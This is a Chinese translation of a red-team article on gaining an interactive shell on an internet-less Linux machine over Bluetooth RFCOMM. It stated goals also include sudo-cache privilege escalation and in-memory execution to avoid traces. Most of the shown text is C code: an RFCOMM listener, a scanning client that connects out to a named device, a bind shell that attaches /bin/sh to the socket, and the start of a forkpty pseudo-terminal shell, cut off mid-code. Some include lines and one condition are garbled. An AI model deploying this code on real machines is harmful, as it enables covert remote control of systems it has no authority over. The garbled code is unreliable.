# 如何只通过蓝牙建立交互式Shell
|
##### 译文声明
本文是翻译文章，文章来源：https://www.tarlogic.com/
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
## 写在前面的话
在练习中，偶尔会碰到一个或几个需要物理访问机器的阶段。在这篇文章中，介绍了如何在没有互联网连接的Linux电脑中使用的物理方法入侵，当然可以使用Wi-Fi和蓝牙。  
这篇文章的主要目的是面向年轻读者，记录和解释以下几点：  
1.如何通过蓝牙在两台设备之间通过RFCOMN交换信息  
2.如何获取交互式shell以运行命令  
3.如何使用sudo缓存以提升权限  
4.如何在内存中运行二进制文件以减少跟踪
## 介绍
由于目标机器不能连接到互联网，所以操作受到了限制，应当考虑其他方案来实现远程操作。最简单的方法是建立一个小型Wi-Fi接入点并将受感染的机器连接到它。然而，考虑到给定的情况，还有另一种方式：通过蓝牙建立通信。
## 通过蓝牙与攻击者连接
为了简单起见，被入侵的机器和Red团队之间的信息交换是通过RFCOMM协议进行的。对接受连接的小型服务器进行编程非常简单，因为它与TCP /
IP应该如何完成相似：
    #include                                         
    #include                                
    #include                                   
     #define BANNER "[+] You are connected to the device!n"        
     // https://people.csail.mit.edu/albert/bluez-intro/x502.html   
     int main (int argc, char *argv[]) {                            
         int s, client;                                             
         /*                                                         
         struct sockaddr_rc {                                       
             sa_family_t rc_family;                                 
             bdaddr_t    rc_bdaddr;                                 
             uint8_t     rc_channel;                                
         };                                                         
         */                                                         
         struct sockaddr_rc loc_addr = {0}, client_addr = {0};      
         socklen_t opt = sizeof(client_addr);                       
         s = socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM);     
         loc_addr.rc_family = AF_BLUETOOTH;                         
         loc_addr.rc_bdaddr = *BDADDR_ANY; // Cualquier adaptador disponible en la máquina                                                   
         loc_addr.rc_channel = (uint8_t) 1; // Canal 1              
         bind(s, (struct sockaddr *)&loc_addr, sizeof(loc_addr));   
         listen(s,1);                                               
         for(;;) {                                                  
             client = accept(s, (struct sockaddr *)&client_addr, &opt);                                                                      
             printf("[+] New connection!n");                       
             // Escribimos un mensaje al cliente que se ha conectado
             write(client, BANNER, strlen(BANNER));                 
         }                                                          
         close(client);                                             
         close(s);
         return 0;                                                          
     }
在运行之前，应该启用蓝牙设备以便进行配对和通信：  
`hciconfig hci0 piscan`
配对完成后，我们可以与使用“BlueTerm”Android应用程序创建的服务器进行通信，以进行概念验证。
作为服务器的其它选择和更好的替代方式是作为客户机。我们必须创建一个小程序来搜索任何可用的蓝牙设备，并基于某个简单的前提（例如，特定的名称或地址）并尝试连接到自己。然后，开始信息交换。下面是如何实现上述逻辑的示例:
    #include 
    #include 
    #include 
    #include 
    #include 
    // Nombre del dispotivo que queremos encontrar
    #define TARGET "Gojira"
    #define BANNER "Connected to device!n"
    // https://people.csail.mit.edu/albert/bluez-intro/c404.html
    int connect_client(char *address) {
        struct sockaddr_rc addr = {0};
        int s, client;
        s = socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM);
        addr.rc_family = AF_BLUETOOTH;
        addr.rc_channel = (uint8_t) 1;
        str2ba(address, &addr.rc_bdaddr);
        client = connect(s, (struct sockaddr*)&addr, sizeof(addr));
        if (client bdaddr, addr);
                memset(name, 0, sizeof(name));
                // Leemos el nombre de los dispositivos descubiertos
                hci_read_remote_name(sock, &(ii+i)->bdaddr, sizeof(name), name, 0);
                // Comprobamos si es el que estamos buscando
                if (strcmp(TARGET, name) == 0) {
                    printf("Found! %s - %sn", name, addr);
                    free(ii);
                    close(sock);
                    connect_client(addr);
                    exit(EXIT_SUCCESS);
                }
            }
        }
    }
这些例子还强调了如何使用异常的RFCOMM来建立快速通信。
## 获取交互式shell
以下步骤是指从我们自己的移动电话或任何其他设备在机器中运行命令。为此，我们将继续以机器本身中等待连接的服务器为例。获取shell最常用的方法是分离进程，使用socket作为`stdin/stdout/stderr`进行子进程并运行命令解释器
    #include lt;stdio.h>
    #include lt;stdlib.h>
    #include lt;unistd.h>
    #include lt;signal.h>
    #include lt;string.h>
    #include lt;sys/socket.h>
    #include lt;bluetooth/bluetooth.h>
    #include lt;bluetooth/rfcomm.h>
    #define BANNER "[+] You are connected to the device!n"
    // https://people.csail.mit.edu/albert/bluez-intro/x502.html
    int main (int args, char *argv[]) {
        int s, client;
        pid_t pid;
        signal(SIGCHLD, SIG_IGN);
        /*     
        struct sockaddr_rc {
            sa_family_t rc_family;
            bdaddr_t    rc_bdaddr;
            uint8_t     rc_channel;
        }; 
        */
        struct sockaddr_rc loc_addr = {0}, client_addr = {0};
        socklen_t opt = sizeof(client_addr);
        s = socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM);
        loc_addr.rc_family = AF_BLUETOOTH;
        loc_addr.rc_bdaddr = *BDADDR_ANY; // Cualquier adaptador disponible en la máquina 
        loc_addr.rc_channel = (uint8_t) 1; // Canal 1
        bind(s, (struct sockaddr *)&loc_addr, sizeof(loc_addr));
        listen(s,1);
        for(;;) {
            client = accept(s, (struct sockaddr *)&client_addr, &opt);
            printf("[+] New connection!n");
            // Escribimos un mensaje al cliente que se ha conectado
            write(client, BANNER, strlen(BANNER));
            pid = fork();
            if (pid == 0) {
                dup2(client, 0);
                dup2(client, 1);
                dup2(client,2);
                execve("/bin/sh", NULL, NULL);
            }
        }
        close(client);
        close(s);
        return 0;
    }
以这种方式运行命令时的根本问题可能是出现了限制，因为我们不能通过SSH启动会话，使用VIM等。
自从几年前，可能是由于OSCP和衍生产品，大量的文章详细介绍了不同的方法，以便从一个有限的shell传递到真正的交互式shell。其中一些方法是：
  * 带`pty.spawn（“/ bin / bash”）`的经典Python单行程式
  * 带`“pty”`选项的Socat
  * `Expect / script`
  * `stty`
但是，如果我们有机会使用我们自己的二进制文件作为在机器中运行命令的方法，使用[forkpty()](https://linux.die.net/man/3/forkpty)，可以创建一个从伪终端操作的子进程，并且可以从那里运行该shell。证明如下：
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define BANNER "[+] You are connected to the device!n"
    // https://people.csail.mit.edu/albert/bluez-intro/x502.html
    int main (int args, char *argv[]) {
        int s, client;
        signal(SIGCHLD, SIG_IGN);
        /*     
        struct sockaddr_rc {
            sa_family_t rc_family;
            bdaddr_t    rc_bdaddr;
            uint8_t     rc_channel;
        }; 
        */
        struct sockaddr_rc loc_addr = {0}, client_addr = {0};
        socklen_t opt = sizeof(client_addr);
        s = socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM);
        loc_addr.rc_family = AF_BLUETOOTH;
        loc_addr.rc_bdaddr = *BDADDR_ANY; // Cualquier adaptador disponible en la máquina 
        loc_addr.rc_channel = (uint8_t) 1; // Canal 1
        bind(s, (struct sockaddr *)&loc_addr, sizeof(loc_addr));
        listen(s,1);
        for(;;) {
            client = accept(s, (struct sockaddr *)&client_addr, &opt);
            printf("[+] New connection!n");
            // Escribimos un mensaje al cliente que se ha conectado
            write(client, BANNER, strlen(BANNER));
            dup2(client, 0);
            dup2(client, 1);
            dup2(client,2);
            //A partir de aquí empieza la magia    
            struct termios terminal;
            int terminalfd, n = 0;
            pid_t pid;
            char input[1024];
            char output[1024];
            // Creamos un nuevo proceso hijo que operará en un pseudoterminal
            pid = forkpty(&terminalfd, NULL, NULL, NULL);